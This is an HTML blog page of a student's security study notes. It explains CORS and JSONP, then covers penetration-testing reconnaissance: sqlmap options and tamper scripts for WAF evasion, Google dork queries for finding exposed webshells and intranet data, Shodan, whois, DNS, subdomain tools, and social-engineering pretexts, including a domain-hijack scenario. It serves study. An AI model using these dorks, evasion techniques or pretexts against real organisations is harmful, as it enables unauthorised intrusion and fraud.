@@ -1,0 +1,2242 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>暑假学习笔记记录 | Gridea</title>
+<meta name="description" content="温故而知新">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1626837321118">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://jinqipiaopiao.github.io//styles/main.css">
+
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+  </head>
+  <body>
+  
+    <nav class="navbar border fixed split-nav">
+  <div class="nav-brand">
+    <h3><a href="https://jinqipiaopiao.github.io/">Gridea</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+      <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+        
+          <li>
+            
+              <a href="/" class="menu">
+                首页
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/archives" class="menu">
+                归档
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/tags" class="menu">
+                标签
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/post/about" class="menu">
+                关于
+              </a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div id="top" class="row site">
+      <div class="sm-12 md-8 col">
+        <div class="paper">
+          <article class="article">
+            <h1>暑假学习笔记记录</h1>
+            <p class="article-meta">
+              2021-07-06
+              
+            </p>
+            
+            <div class="post-content">
+              <h1 id="2021-07-06">2021-07-06:</h1>
+<h1 id="cors详解">CORS详解</h1>
+<p>CORS是一个W3C标准，全称是跨域资源共享<br>
+它允许浏览器向跨源夫区其发乎XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制<br>
+一。简介<br>
+CORS需要和浏览器和服务器同时支持，目前，所有浏览器都支持该功能，IE浏览器不能低于IE10<br>
+整个CORS通信过程，都是刘阿龙年起自动完成，不需要用户参与，对于开发者来说，CORS同行与与同源的AJAX通信没有差别，代码完全一样，浏览器一旦法相ajax请求跨源，就会子哦对那个添加一些附加的头星系，有时还会多出一次附加的请求，但用户不会有感觉，<br>
+因此实现cors通信的关键是服务器，只要服务器实现了cors接口，就可以实现跨源通信<br>
+二。两种请求<br>
+浏览器将cors请求分成两类，简单请求和非简单请求<br>
+只要同时满足以下两大条件就属于简单请求<br>
+1）请求方法是一下三种方法之一：<br>
+HEAD<br>
+GET<br>
+POST<br>
+2）HTTP的头信息不超过一下几种字段：<br>
+Accept<br>
+Accept-Language<br>
+Content-Language<br>
+Last-Event-ID<br>
+Content-Type：只限于三个值application/x-www-form-urlencoded,multipart/form-data,text/plain<br>
+这是为了兼容表单，因为历史上表单一直可以发出跨域请求，AJAX的跨域设计就是，只要表单可以发，AJAX就可以直接发<br>
+凡是不满足两个条件的是属于非简单请求<br>
+浏览器对这两种请求的处理，是不一样的<br>
+三，简单请求<br>
+3.1<strong>基本流程</strong><br>
+对于简单请求，浏览器直接发出cors请求，具体来说，就是在头信息之中增加一个orign字段<br>
+下面是一个例子，浏览器发现这次跨源AJAX请求时简单请求就自动在头信息之中添加一个Origin字段</p>
+<pre><code>GET /cors HTTP/1.1
+Origin: http://api.bob.com
+Host: api.alice.com
+Accept-Language: en-US
+Connection: keep-alive
+User-Agent: Mozilla/5.0...
+</code></pre>
+<p>上面的头信息中，Origin字段来说明本次请求来自哪个源（协议+域名+端口），服务器根据这个值来决定是否同意这次请求<br>
+如果Origin指定的源，不子啊许可范围内，服务器就会返回一个正常的HTTP回应，浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段，就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获，这种错误无法通过状态之别，因为HTTP回应的状态码可能是200<br>
+如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。</p>
+<p>如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p>
+<p>Access-Control-Allow-Origin: http://api.bob.com<br>
+Access-Control-Allow-Credentials: true<br>
+Access-Control-Expose-Headers: FooBar<br>
+Content-Type: text/html; charset=utf-8<br>
+上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。</p>
+<p>（1）Access-Control-Allow-Origin</p>
+<p>该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。</p>
+<p>（2）Access-Control-Allow-Credentials</p>
+<p>该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。</p>
+<p>（3）Access-Control-Expose-Headers</p>
+<p>该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader('FooBar')可以返回FooBar字段的值。</p>
+<p>3.2 <strong>withCredentials 属性</strong><br>
+上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。</p>
+<p>Access-Control-Allow-Credentials: true<br>
+另一方面，开发者必须在AJAX请求中打开withCredentials属性。</p>
+<p>var xhr = new XMLHttpRequest();<br>
+xhr.withCredentials = true;<br>
+否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。</p>
+<p>但是，如果省略withCredentials设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭withCredentials。</p>
+<p>xhr.withCredentials = false;<br>
+需要注意的是，如果要发送Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。</p>
+<p>四、非简单请求<br>
+<strong>4.1 预检请求</strong><br>
+非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。</p>
+<p>非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为&quot;预检&quot;请求（preflight）。</p>
+<p>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。</p>
+<p>下面是一段浏览器的JavaScript脚本。</p>
+<p>var url = 'http://api.alice.com/cors';<br>
+var xhr = new XMLHttpRequest();<br>
+xhr.open('PUT', url, true);<br>
+xhr.setRequestHeader('X-Custom-Header', 'value');<br>
+xhr.send();<br>
+上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息X-Custom-Header。</p>
+<p>浏览器发现，这是一个非简单请求，就自动发出一个&quot;预检&quot;请求，要求服务器确认可以这样请求。下面是这个&quot;预检&quot;请求的HTTP头信息。</p>
+<p>OPTIONS /cors HTTP/1.1<br>
+Origin: http://api.bob.com<br>
+Access-Control-Request-Method: PUT<br>
+Access-Control-Request-Headers: X-Custom-Header<br>
+Host: api.alice.com<br>
+Accept-Language: en-US<br>
+Connection: keep-alive<br>
+User-Agent: Mozilla/5.0...<br>
+&quot;预检&quot;请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。</p>
+<p>除了Origin字段，&quot;预检&quot;请求的头信息包括两个特殊字段。</p>
+<p>（1）Access-Control-Request-Method</p>
+<p>该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。</p>
+<p>（2）Access-Control-Request-Headers</p>
+<p>该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。</p>
+<p><strong>4.2 预检请求的回应</strong><br>
+服务器收到&quot;预检&quot;请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。</p>
+<p>HTTP/1.1 200 OK<br>
+Date: Mon, 01 Dec 2008 01:15:39 GMT<br>
+Server: Apache/2.0.61 (Unix)<br>
+Access-Control-Allow-Origin: http://api.bob.com<br>
+Access-Control-Allow-Methods: GET, POST, PUT<br>
+Access-Control-Allow-Headers: X-Custom-Header<br>
+Content-Type: text/html; charset=utf-8<br>
+Content-Encoding: gzip<br>
+Content-Length: 0<br>
+Keep-Alive: timeout=2, max=100<br>
+Connection: Keep-Alive<br>
+Content-Type: text/plain<br>
+上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</p>
+<p>Access-Control-Allow-Origin: *<br>
+如果服务器否定了&quot;预检&quot;请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。</p>
+<p>XMLHttpRequest cannot load http://api.alice.com.<br>
+Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.<br>
+服务器回应的其他CORS相关字段如下。</p>
+<p>Access-Control-Allow-Methods: GET, POST, PUT<br>
+Access-Control-Allow-Headers: X-Custom-Header<br>
+Access-Control-Allow-Credentials: true<br>
+Access-Control-Max-Age: 1728000<br>
+（1）Access-Control-Allow-Methods</p>
+<p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次&quot;预检&quot;请求。</p>
+<p>（2）Access-Control-Allow-Headers</p>
+<p>如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在&quot;预检&quot;中请求的字段。</p>
+<p>（3）Access-Control-Allow-Credentials</p>
+<p>该字段与简单请求时的含义相同。</p>
+<p>（4）Access-Control-Max-Age</p>
+<p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</p>
+<p><strong>4.3 浏览器的正常请求和回应</strong><br>
+一旦服务器通过了&quot;预检&quot;请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。</p>
+<p>下面是&quot;预检&quot;请求之后，浏览器的正常CORS请求。</p>
+<p>PUT /cors HTTP/1.1<br>
+Origin: http://api.bob.com<br>
+Host: api.alice.com<br>
+X-Custom-Header: value<br>
+Accept-Language: en-US<br>
+Connection: keep-alive<br>
+User-Agent: Mozilla/5.0...<br>
+上面头信息的Origin字段是浏览器自动添加的。</p>
+<p>下面是服务器正常的回应。</p>
+<p>Access-Control-Allow-Origin: http://api.bob.com<br>
+Content-Type: text/html; charset=utf-8<br>
+上面头信息中，Access-Control-Allow-Origin字段是每次回应都必定包含的。</p>
+<p>五、与JSONP的比较<br>
+CORS与JSONP的使用目的相同，但是比JSONP更强大。</p>
+<p>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p>
+<h1 id="jsonp跨域原理解析">jsonp跨域原理解析</h1>
+<p>背景：<br>
+由于浏览器同源策略的限制，非同源下的请求，都会产生跨域问题，jsonp即是为了解决这个问题出现的一种简便解决方案。</p>
+<p>同源策略即：同一协议，同一域名，同一端口号。当其中一个不满足时，我们的请求即会发生跨域问题。</p>
+<p>举个简单的例子：</p>
+<p>http://www.abc.com:3000到https://www.abc.com:3000的请求会出现跨域（域名、端口相同但协议不同）<br>
+http://www.abc.com:3000到http://www.abc.com:3001的请求会出现跨域（域名、协议相同但端口不同）<br>
+http://www.abc.com:3000到http://www.def.com:3000的请求会出现跨域（域名不同）<br>
+突破同源策略限制：<br>
+现在知道了同源策略，那我们就来看下jsonp是如何突破同源策略的限制实现跨域的</p>
+<p>首先，不知道大家有没有注意，不管是我们的script标签的src还是img标签的src，或者说link标签的href他们没有被同源策略所限制，比如我们有可能使用一个网络上的图片，就可以请求得到</p>
+<pre><code>&lt;img src=&quot;https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/image/h%3D300/sign=6d0bf83bda00baa1a52c41bb7711b9b1/0b55b319ebc4b745b19f82c1c4fc1e178b8215d9.jpg&quot;&gt;
+</code></pre>
+<p>src或href链接的静态资源，本质上来说也是一个get请求，拿csdn上的静态资源举例：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625536762106.png" alt="" loading="lazy"><br>
+可以看到，确实是个get请求无疑。同理img标签的src和link标签的href也会发送一个get请求去请求静态资源。那么我们通过这点，是不是发现了点什么，这些标签的src和link属性，并没有受同源策略的限制。说到这里jsonp的实现原理就浮出水面了。</p>
+<p>jsonp就是使用同源策略这一“漏洞”，实现的跨域请求（这也是jsonp跨域只能用get请求的原因所在）。想象一下，既然是个get请求，那么服务端一定可以接收到，并做出反馈。ok，知道这两点之后，我们开始具体使用jsonp进行跨域请求。</p>
+<p>JSONP跨域实现：<br>
+根据上边所说的，我们要用过利用srcipt标签的src属性来实现，那么我们如何做呢，我们来看一段简单的代码，为了方便，我这里使用jQuery：</p>
+<pre><code>$('#btn').click(function(){
+		var frame = document.createElement('script');
+		frame.src = 'http://localhost:3000/article-list?name=leo&amp;age=30&amp;callback=func';
+		$('body').append(frame);
+	});
+</code></pre>
+<p>可以看到，让我们点击按钮的时候，创建了一个script标签(即会发送一个get请求到src指向的地址,注意：这里必须使用scipt标签，否则返回的数据不会被当作js执行)，src地址是&quot;localhost:3000/article-list&quot;,这个src地址，就是我们请求的服务端接口。注意，这里我们有是那个参数，name,age和callback，name和age不说了，这跟我们平时普通的get请求参数无异。主要说下callback这个参数，callback参数就是核心所在。为什么要定义callback呢？首先我们知道，这个get请求已经被发出去了，那么我们如何接口请求回来的数据呢，callback=func则可以帮我们做这件事。我们继续看下边的代码</p>
+<pre><code>&lt;button id=&quot;btn&quot;&gt;点击&lt;/button&gt;
+&lt;script src=&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;
+$('#btn').click(function(){
+var frame = document.createElement('script');
+frame.src = 'http://localhost:3000/article-list?name=leo&amp;age=30&amp;callback=func';
+$('body').append(frame);
+});
+    
+function func(res){
+alert(res.message+res.name+'你已经'+res.age+'岁了');
+}
+&lt;/script&gt;
+</code></pre>
+<p>这里可以看到，我们声明了一个func函数，但没有执行，你可以想一下，如果服务端接口到get请求，返回的是<code>func({message:'hello'})</code>，这样的话在服务端不就可以把数据通过函数执行传参的方式实现数据传递了吗。</p>
+<p>服务端代码实现：<br>
+接下来，我们看服务端应该如何实现：</p>
+<pre><code>router.get('/article-list', (req, res) =&gt; {
+console.log(req.query, '123');
+let data = {
+message: 'success!',
+name: req.query.name,
+age: req.query.age
+}
+data = JSON.stringify(data)
+res.end('func(' + data + ')');
+});
+</code></pre>
+<p>ok，接下来当我们点击提交的时候，就获取到了服务端反回的数据。如下：</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1625536769055.png" alt="" loading="lazy"><br>
+这样下来，就完成了实现jsonp的跨域。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625536798447.png" alt="" loading="lazy"><br>
+总结：<br>
+需要注意的是，callback参数定义的方法是需要前后端定义好的，具体什么名字，商讨好就可以了。其实jsonp的整个过程就类似于前端声明好一个函数，后端返回执行函数。执行函数参数中携带所需的数据<br>
+————————————————<br>
+版权声明：本文为CSDN博主「机智的赵先生」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/badmoonc/article/details/82289252</p>
+<h1 id="注入神器-sqlmap">注入神器 -SQLmap</h1>
+<p>结合sqlmap 查询数据库：--dbs/--current-db 查询表：--tables/--tables-D 查询列：--dump-all/--dump-C-T-D<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625561849173.png" alt="" loading="lazy"><br>
+<strong>tamper脚本</strong><br>
+我们在下载好的SQLmap文件夹里可以找到文件夹tamper，其中该文件夹有44个脚本分别对57种WAF进行检测。例如360，绿盟WAF，modsecurity.，百度，fortiweb，cloudflare。由此可见老外对国内的WAF也是有了解的，可见他们也会悄悄对国内的WAF进行绕过。</p>
+<p>其实一个简单的Tamper能够帮助我们修改Payload，修改请求头中的Header值，从而绕过IDS/WAF的检测。</p>
+<p>这里的Payload就是指我们的每一个检测注入的SQL，在注入的时候我们可以加上-v 3参数来查看Payload。<br>
+————————————————<br>
+版权声明：本文为CSDN博主「是彻彻呀」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/Candyys/article/details/105892510<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625562721066.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625562724465.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625562728440.png" alt="" loading="lazy"></p>
+<h1 id="html注入">HTML注入</h1>
+<p>HTML注入有时也被称为虚拟污染。这实际是一个由站点造成的攻击，该站点允许恶意用户向其Web页面注入HTML，并且没有合理处理用户输入。换句话说，HTML注入漏洞是由网站接收HTML引起的，一般出现在网站页面的表单输入。</p>
+<p>由于HTML是用于定义网页结构的语言，如果攻击者可以注入HTML，它们基本上可以改变浏览器呈现的内容。有时，这可能会导致页面外观的完全改变，或在其他情况下，创建表单来欺骗用户。例如，如果你可以注入HTML，你也许能够将&lt; form &gt;标签添加到页面，要求用户重新输入他们的用户名和密码。然而，当提交此表单时，它实际上将信息发送给了攻击者。<br>
+————————————————<br>
+版权声明：本文为CSDN博主「三体-二向箔」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/weixin_39157582/article/details/108157825</p>
+<h1 id="2021-07-07">2021-07-07</h1>
+<p><strong>渗透测试过程环节七大步</strong></p>
+<p>前期交互阶段<br>
+情报收集阶段<br>
+威胁建模阶段<br>
+漏洞分析阶段<br>
+渗透攻击阶段<br>
+后渗透攻击阶段POST<br>
+报告阶段</p>
+<p>前期交互阶段：与客户进行交互讨论，确定渗透测试范围，目标，限制条件以及服务合同等细节<br>
+情报收集阶段：利用各种信息来源与搜索技术方法，尝试获取更多关于目标组织网络拓扑，系统配置与安全防御措施的信息<br>
+威胁建模阶段：在收集到充分的信息进行威胁建模与攻击策划，确定出最可行的攻击通道<br>
+漏洞分析阶段：找出可以渗透攻击的供给端，或者针对系统与服务进行安全漏洞探测与挖掘<br>
+渗透攻击阶段：获取访问控制权<br>
+后渗透攻击阶段：寻找客户组织最具价值和尝试安全保护的信息和资产，最终达成能够对客户组织造成最重要业务影响的攻击途径<br>
+报告阶段：渗透测试的过程详细描述，以及修补与升级方案<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625697651721.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625697656559.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625697662431.png" alt="" loading="lazy"></p>
+<p><strong>信息收集</strong></p>
+<p>概念：黑客为了更加有效的实施攻击而在攻击前或攻击或成汇总对目标的所有探测活动<br>
+目的：<br>
+了解安全架构：信息收集使攻击者能够了解组织完整的安全架构<br>
+缩小攻击范围：通过ip地址范围，网络，域名，元测化工你访问点等信息，可以缩小攻击范围<br>
+建立信息数据库：攻击者能够建立他们自己的相关目标组织安全性弱点的信息数据库来采取下一次的入侵行动<br>
+描绘网络拓扑：攻击者可以描绘出目标组织的网络拓扑图，分析最容易进入的攻击路径<br>
+信息收集对于深渗透来说是非常重要的一步，手机的信息越详细对以后渗透测试的影响越大，毫不夸张地说，信息的收集决定着渗透的成功与否</p>
+<p>分类：<br>
+被动信息收集：被动信息收集也就是或不会与目标服务器做直接的交互，在不被目标系统察觉的情况下，通过搜索引擎，社交媒体等方式对目标外围的i西南西进行收集，例如网站的whois信息，DNS信息，管理员以及工作人员的个人信息等等<br>
+主动信息收集：主动收集会与目标系统有直接的交互，从而得到目标系统相关的一些情报信息，例如：主机开发的端口，结构等等站点的目录</p>
+<p>内容：<br>
+网络信息：域名，内网域名，网段，授权可访问的IP地址，内部网络，开放的TCP、UDP端口，访问控制机制和ACL，运行的网络协议，VPN接入点，访问控制策略，运行的IDS监听策略模拟，数字段话号码认证机制，系统评估措施，防火墙等安全设施<br>
+系统信息：用户和用户组名系统表示banner路由表，snmp信息，系统架构，远程系统类型，系统用户名，密码，站点目录，测试/临时文件<br>
+组织信息：员工信息，组织网站，公司地址，位置详情，地址和电话号码，邮箱地址，HTML代码中的注释，实行的安全策略，与组织相关的web服务，组织的背景，发布的新闻</p>
+<p>方法：<br>
+搜索引擎，whois<br>
+网站，DNS<br>
+邮件，网络信息收集<br>
+竞争情报，社会工程学<br>
+Google，社交网站<br>
+Google作为黑客工具，site指定域名，inurl：url中存在关键字的网页，intext：网页正文中的关键字，filetype：指定文件类型，intitle：网页标题中的关键字，link：baidu.com即表示返回所有和baidu.com做了来凝结的url，info：查找指定站点的一些基本信息，cache：搜索google里关于某些内容的缓存，site:edu.cn intext：后台管理<br>
+intitle:&quot;php shell*&quot; &quot;Enable stderr&quot; filetype:php <br>
+查找利用php webshell<br>
+intitle—网页标题<br>
+Enable stderr—UNIX标准输出和标准错误的缩写<br>
+filetype—文件类型 <br>
+intitle:intranet inurl:intranet+intext:”human resources”<br>
+访问目标公司的私有网络和收集诸如员工列表、联系方式等敏感信息，这些是对于社会工程学来讲是非常有用的</p>
+<p><strong>Shodan搜索引擎</strong></p>
+<p>定义：是一个用于帮助发现主要的互联网系统漏洞（包括路由器，交换机工控系统等）的搜索引擎，它主要拦截从服务器到客户端的元数据来工作，目前提供查过50个端口的相关搜索</p>
+<p>范围：服务器，路由器，交换机，公共ip的打印机，网络摄像头，加油站的泵，voip电话和所有数据采集监控系统</p>
+<p>作用：用户搜索指定的项目，寻找端口并且拦截数据，为拦截的数据设置索引，显示结果</p>
+<p>GOOGLE和SHODAN的区别：<br>
+Google的爬虫、蜘蛛，抓取网页数据并且为网页内容创建索引，Shodan主要寻找端口并且抓取拦截到的信息，然后为他们建立索引，最后显示结果。shodan是一个基于拦截器的搜索引擎</p>
+<h1 id="whois信息收集">whois信息收集</h1>
+<p>whois（读作“Who is”，非缩写）是用来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令列接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令列接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。</p>
+<p>可以获取：域名详细信息，域名所有者的联系方式，域名服务器，网络ip地址范围，域名创建时间，过期记录，最近更新记录</p>
+<p>作用绘制详细的网络拓扑图，收集可以用来进行社会工程学的个人信息，收集其他内网信息</p>
+<h1 id="dns常用资源记录类型">DNS常用资源记录类型</h1>
+<p>常用的资源记录类型<br>
+A 地址 此记录列出特定主机名的 IP 地址。这是名称解析的重要记录。<br>
+CNAME 标准名称 此记录指定标准主机名的别名。<br>
+MX邮件交换器此记录列出了负责接收发到域中的电子邮件的主机。<br>
+NS名称服务器此记录指定负责给定区域的名称服务器。<br>
+PTR将IP地址映射到主机名</p>
+<h1 id="dns查询">DNS查询</h1>
+<p>收集子域名信息的理由：直接从主域入手显然是很不明智的选择。因为它一般是重点防护区域，所以不如先进入目标的某个子域，再想办法迂回接近真正的目标！</p>
+<p>用于子域名检测的工具主要有： Layer子域名挖掘机、K8、wydomain、Sublist3r、dnsmaper、subDomainsBrute等。还可以用搜索引擎枚举，例如要搜索百度旗下的子域名就可以使用：<br>
+site:baidu.com<br>
+也可以利用一些网站来查子域名信息：  https://dnsdumpster.com       https://crt.sh    https://censys.io    子域名爆破网站：  https://phpinfo.me/domain      ip反查绑定域名网站:    http://dns.aizhan.com</p>
+<p><strong>了解nslookup:</strong><br>
+Nslookup 是一个用来查询Internet域名服务器基础结构的信息的程序。<br>
+Nslookup有两种模式：交互式和非交互式。<br>
+交互模式容许用户查询域名服务器，获取各种关于主机和域名的信息或输出一个域内的主机列表。<br>
+非交互模式用于只输出一个主机或域名的名字和要求的信息。<br>
+使用前提：<br>
+Nslookup 必须要安装了TCP/IP 协议的网络环境之后才能使用。</p>
+<p><strong>dig</strong>（域信息搜索器）命令是一个在类Unix命令行模式下用于询问 DNS 域名服务器的灵活的工具。它执行 DNS 搜索，显示从受请求的域名服务器返回的答复。多数 DNS 管理员利用 dig 作为 DNS 问题的故障诊断，因为它灵活性好、易用、输出清晰。虽然通常情况下 dig 使用命令行参数，但它也可以按批处理模式从文件读取搜索请求。</p>
+<p>网络信息收集 - 确定网络地址范围<br>
+http://www.networksolutions.com/whois/index.jsp</p>
+<p>确定网络地址范围的作用：</p>
+<p>网络范围信息可以协助攻击者绘制目标网络的拓扑图<br>
+使用ARIN whois database search工具找到IP地址的范围<br>
+可以通过区域因特网注册机构找到IP地址范围和目标组织使用子网掩码</p>
+<h1 id="netcraft确定网站操作系统">netcraft确定网站操作系统</h1>
+<p>Netcraft公司于1994年底在英国成立，多年来一直致力于互联网市场以及在线安全方面的咨询服务，其中在国际上最具影响力的当属其针对网站服务器，域名解析/主机提供商，以及SSL市场所做的客观严谨的分析研究。——来自百度百科。当然这个不是今天要介绍的，今天要介绍的是Netcraft下面的一些功能。这些功能为我们查询指定域名的网站的一些信息，于了解一个网站的信息还是非常有帮助的。比如：，网站使用技术，安全信息，IP地址，DNS等一系列信息。当然，如果你愿意，还可以监控这个网站的performance。OS及历史变更<br>
+　　查询网站的一些基本信息的使用的方式也非常的简单。进入Netcraft官网，找到What's that site running?在搜索框中输入你需要查找的域名，网站将返回所有关于该域名下的域名信息列表（含服务器信息），如果想了解指定域名下的详细信息，只需要在Site Report那栏点击即可了解非常详细的信息。<br>
+http://uptime.netcraft.com/up/graph</p>
+<h1 id="社会工程学信息收集">社会工程学信息收集</h1>
+<p>通过社交工程企图收集：<br>
+信用卡信息和社保号<br>
+用户名和密码<br>
+其他个人信息<br>
+使用的安全性产品<br>
+操作系统和软件版本<br>
+网络布置信息<br>
+IP地址和服务器名</p>
+<p>社交工程师使用的技术：<br>
+窃听：窃听就是未被允许的偷听对话或读取信息<br>
+拦截通讯信息，比如音频、视频或书写文档<br>
+肩窥：监听就是攻击者在后面偷窥用户已获取重要信息的过程<br>
+攻击者获取如密码、身份证号、账户密码、信用卡信息等<br>
+垃圾搜索：垃圾搜索就是从某人的垃圾箱中寻找有用信息<br>
+它包括从目标公司垃圾箱、打印机垃圾箱、用户桌面上的备注中收集电话账单、通讯信息、金融信息、相关业务等信息。<br>
+在社交网络中模仿他人</p>
+<p>社会工程学（Social Engineering）：<br>
+一种通过对受害者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱进行诸如欺骗、伤害等危害手段取得自身利益的手法，已成迅速上升甚至滥用的趋势。那么，什么算是社会工程学呢？<br>
+它并不能等同于一般的欺骗手法，社会工程学尤其复杂，即使自认为最警惕最小心的人，一样会被高明的社会工程学手段损害利益。<br>
+社会工程学陷阱就是通常以交谈、欺骗、假冒或口语等方式，从合法用户中套取用户系统的秘密。<br>
+社会工程学是一种与普通的欺骗和诈骗不同层次的手法。</p>
+<p>社工库：是用社会工程学进行攻击时积累的各方数据的结构化数据库。<br>
+CASE1: 给目标公司的销售人员发送邮件，假装对某个产品很感兴趣，显然销售人员会回复邮件。这样攻击者就可以通过分析邮件头来收集这家公司的真实IP地址及内部电子邮件服务器的相关信息。<br>
+CASE2: 假设现在已经收集到了目标人物的邮箱、QQ、电话号码、姓名、以及域名服务商，也通过爆破或者撞库的方法获取了邮箱的密码，这时就可以冒充目标人物要求客服人员协助重置域管理密码，甚至技术人员会帮着重置密码，从而使攻击者拿下域管理控制台，然后做域劫持！</p>
+<p>#社交网站信息收集：<br>
+社交网络SNS<br>
+理论来源：六度理论</p>
+<p>SNS：专指在帮助人们建立社会性网络的互联网应用服务。也指社会现有已成熟普及的信息载体，如短信SMS服务。SNS的另一种常用解释：全称Social Network Site，即“社交网站”或“社交网”。<br>
+六度分割理论：<br>
+你和任何一个陌生人之间所间隔的人不会超过六个，也就是说，最多通过五个中间人你就能够认识任何一个陌生人。<br>
